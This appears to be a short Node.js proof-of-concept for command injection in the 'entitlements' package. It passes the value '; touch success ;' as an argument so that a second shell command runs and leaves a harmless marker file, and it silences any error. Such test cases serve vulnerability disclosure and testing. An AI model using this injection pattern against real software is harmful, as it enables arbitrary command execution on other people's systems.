'use strict';

const Entitlements = require('entitlements');

const payload = "; touch success ;";

try {
  Entitlements(payload, function (error, data) {});
} catch (_) {}
